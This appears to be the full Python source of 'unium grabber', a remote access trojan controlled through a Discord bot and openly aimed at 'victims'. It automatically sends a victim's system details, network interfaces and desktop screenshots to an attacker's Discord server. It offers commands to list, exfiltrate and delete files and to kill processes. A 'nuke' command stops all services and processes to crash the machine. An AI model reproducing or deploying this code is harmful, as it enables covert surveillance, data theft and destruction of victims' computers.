# unium grabber developers: @soacy
# honorable mentions: ChatGPT 3.5

# Feel free to change any code to your liking! (my code shitty ik lol)
# If you didn't read anything in the github please take a moment to read it, if you don't know what you are doing.

import io
import os
import json
import ctypes
import pyautogui
import discord
import psutil
import platform
import subprocess
import asyncio
from discord.ext import commands

token = "YOUR_BOT_TOKEN_HERE"
prefix = "."

intents = discord.Intents.all()
intents.members = True

client = commands.Bot(command_prefix=prefix, intents=intents)

@client.command() # Screenshot Command
async def ss(ctx):
    await ctx.channel.purge(limit=1)
    await take_screenshot()

@client.command() # Process List Command
async def proclist(ctx): 
  await ctx.channel.purge(limit=1)
  try:
    with open("process_list.txt", "w") as f:
      for i, proc in enumerate(psutil.process_iter(['name', 'pid'])):
        f.write(f"[{proc.info['pid']}] {proc.info['name']}\n")

    await ctx.send(file=discord.File("process_list.txt"))
    os.remove("process_list.txt")

  except Exception as e:
    await ctx.send(f"Error getting process list: {e}")
    asyncio.wait(2)
    await ctx.channel.purge(limit=2)

@client.command() # End Process Command
async def endproc(ctx, proc_identifier: str):
    if proc_identifier.isdigit():
        proc_identifier = int(proc_identifier)

    for proc in psutil.process_iter():
        try:
            if proc.name() == proc_identifier or proc.pid == proc_identifier:
                proc.terminate()
                await ctx.send(f"Process {proc_identifier} has been terminated.")
                asyncio.wait(6)
                await ctx.channel.purge(limit=2)
                return
        except psutil.NoSuchProcess:
            pass

    await ctx.send(f"No process found with identifier {proc_identifier}.")
    asyncio.wait(6)
    await ctx.channel.purge(limit=2)

@client.command() # Grabs files
async def filelist(ctx):
    await ctx.channel.purge(limit=1)
    files_list = [filename for filename in os.listdir() if os.path.isfile(filename)]

    file_content = "\n".join(files_list)

    with open('files_list.txt', 'w') as f:
        f.write(file_content)

    with open('files_list.txt', 'rb') as f:
        await ctx.send("Files in the same directory:", file=discord.File(f, filename='files_list.txt'))

    os.remove('files_list.txt')

@client.command() # Sends file
async def filesend(ctx, file_name: str):
    if os.path.isfile(file_name):
        await ctx.channel.purge(limit=1)
        with open(file_name, 'rb') as f:
            await ctx.send(file=discord.File(f, filename=file_name))
    else:
        await ctx.send(f"File '{file_name}' not found.")
        asyncio.wait(6)
        await ctx.channel.purge(limit=2)

@client.command() # Deletes file
async def filedel(ctx, file_name: str):
    if os.path.isfile(file_name):
        try:
            os.remove(file_name)
            await ctx.send(f"File '{file_name}' has been deleted successfully.")
            asyncio.wait(6)
            await ctx.channel.purge(limit=2)
        except Exception as e:
            await ctx.send(f"An error occurred while deleting file '{file_name}': {str(e)}")
            asyncio.wait(6)
            await ctx.channel.purge(limit=2)
    else:
        await ctx.send(f"File '{file_name}' not found.")
        asyncio.wait(6)
        await ctx.channel.purge(limit=2)

@client.command() # Nuke PC Command..
async def nuke(ctx):
    confirm_msg = await ctx.send("**☢ Are you sure you want to Nuke their PC? ☢**\n*This will basically bluescreen them. This might corrupt files.*")
    await confirm_msg.add_reaction('✅')
    await confirm_msg.add_reaction('❌')

    def check(reaction, user):
        return user == ctx.author and str(reaction.emoji) in ['✅', '❌'] and reaction.message == confirm_msg

    try:
        reaction, user = await client.wait_for('reaction_add', timeout=60.0, check=check)
    except asyncio.TimeoutError:
        await ctx.send('You took too long to react, nuke cancelled.')
    else:
        if str(reaction.emoji) == '✅': 
            end_all_services()
            end_all_processes()
            for _ in range(100):
                ctypes.windll.user32.MessageBoxW(0, "YOUR PC HAS BEEN NUKED BY /UNIUM GRABBER", "/unium grabber on top", 0)
            ctx.send("Nuked.")
            asyncio.wait(6)
            await ctx.channel.purge(limit=3)

        elif str(reaction.emoji) == '❌': 
            await ctx.send("Nuke cancelled.")
            asyncio.wait(6)
            await ctx.channel.purge(limit=3)

def end_all_services(): # Nuke all services
    services_output = subprocess.check_output('sc query state= all', shell=True, universal_newlines=True)
    service_names = [line.split()[1] for line in services_output.split('\n') if line.strip().startswith('SERVICE_NAME')]
    for service_name in service_names:
        subprocess.run(["sc", "stop", service_name], shell=True)

def end_all_processes(): # Nuke all proccesses
    running_processes = psutil.process_iter()
    for process in running_processes:
        try:
            process.terminate()
        except psutil.AccessDenied:
            pass

async def get_pc_info(): # Grabbing pc info
    guild = client.guilds[0]
    pc_name = platform.node()
    existing_category = discord.utils.get(guild.categories, name=pc_name)

    if not existing_category:
        main = await guild.create_category(pc_name)
    else:
        main = existing_category

    system_channel = discord.utils.get(main.channels, name='system')
    if not system_channel:
        system_channel = await main.create_text_channel('system')

    pc_info = f""
    pc_info += f"PC Name: {platform.node()}\n"
    pc_info += f"System: {platform.system()} {platform.release()}\n"
    pc_info += f"Processor: {platform.processor()}\n"
    pc_info += f"Architecture: {platform.architecture()[0]}\n"
    pc_info += f"OS Version: {platform.version()}\n"
    pc_info += f"Manufacturer: {platform.system()} {platform.machine()}\n"
    pc_info += f"Configuration: {platform.platform()}\n"
    mem = psutil.virtual_memory()
    pc_info += f"\nTotal Memory: {mem.total / (1024 ** 3):.2f} GB\n"
    disk = psutil.disk_usage('/')
    pc_info += f"Total Disk Space: {disk.total / (1024 ** 3):.2f} GB\n"
    pc_info += f"Free Disk Space: {disk.free / (1024 ** 3):.2f} GB\n"
    
    system_thumbnail_url = "https://cdn-icons-png.flaticon.com/512/4370/4370714.png"
    pc_embed = create_embed("System Information", pc_info, 0xFFFFFF, thumbnail_url=system_thumbnail_url)
    await system_channel.send(embed=pc_embed)

async def get_network_info(): # Grabbing network info
    guild = client.guilds[0]
    pc_name = platform.node()
    existing_category = discord.utils.get(guild.categories, name=pc_name)

    if not existing_category:
        main = await guild.create_category(pc_name)
    else:
        main = existing_category

    network_channel = discord.utils.get(main.channels, name='network')
    if not network_channel:
        network_channel = await main.create_text_channel('network')

    net_info = f""
    net_if_addrs = psutil.net_if_addrs()
    for interface_name, interface_addresses in net_if_addrs.items():
        net_info += f"\n {interface_name}:\n"
        for address in interface_addresses:
            net_info += f"   - Address: {address.address}\n"
            net_info += f"   - Netmask: {address.netmask}\n"
            net_info += f"   - Broadcast IP: {address.broadcast}\n"

    network_thumbnail_url = "https://upload.wikimedia.org/wikipedia/commons/thumb/0/08/Internet-icon.svg/470px-Internet-icon.svg.png"
    net_embed = create_embed("Network Information", net_info, 0xFFFFFF, thumbnail_url=network_thumbnail_url)
    await network_channel.send(embed=net_embed)

async def take_screenshot(): # Taking a screenshot and sending it
    screenshot = pyautogui.screenshot()
    
    pc_name = platform.node()
    guild = client.guilds[0]
    
    for category in guild.categories:
        if category.name == pc_name:
            desktop_channel = discord.utils.get(category.channels, name='desktop')
            if not desktop_channel:
                desktop_channel = await category.create_text_channel('desktop')
            
            with io.BytesIO() as image_binary:
                screenshot.save(image_binary, 'PNG')
                image_binary.seek(0)

                embed = discord.Embed(title='.ss to take another', color=0xFFFFFF)
                embed.set_author(name="/unium grabber")
                embed.set_image(url="attachment://screenshot.png")

                await desktop_channel.send(embed=embed, file=discord.File(image_binary, 'screenshot.png'))
            
            break
    else:
        pass

async def send_commands_info(): # Sending commands
    guild = client.guilds[0]
    pc_name = platform.node()
    existing_category = discord.utils.get(guild.categories, name=pc_name)

    if not existing_category:
        main = await guild.create_category(pc_name)
    else:
        main = existing_category

    commands_channel = discord.utils.get(main.channels, name='commands')
    if not commands_channel:
        commands_channel = await main.create_text_channel('commands')

    commands_info = "**/unium grabber commands**```\n.ss - Takes a screenshot\n.proclist - Shows all running processes\n.endproc (name / pid) - End a process\n.filelist - Gets files in the same directory\n.filesend (name) - Sends that file to you\n.filedel (name) - Deletes a file\n.nuke - Destroys your victims pc...```"
    await commands_channel.send(commands_info)

def create_embed(title, description, color, thumbnail_url=None): # Embed Stuff
    embed = discord.Embed(title=title, description=description, color=color)
    embed.set_author(name='/unium grabber')
    if thumbnail_url:
        embed.set_thumbnail(url=thumbnail_url)
    return embed

@client.event
async def on_ready(): # Main stuff
    guild = client.guilds[0]
    pc_name = platform.node()
    existing_category = discord.utils.get(guild.categories, name=pc_name)

    if not existing_category:
        main = await guild.create_category(pc_name)
    else:
        main = existing_category

    await get_pc_info()
    await get_network_info()
    await take_screenshot()
    await send_commands_info()

client.run(token)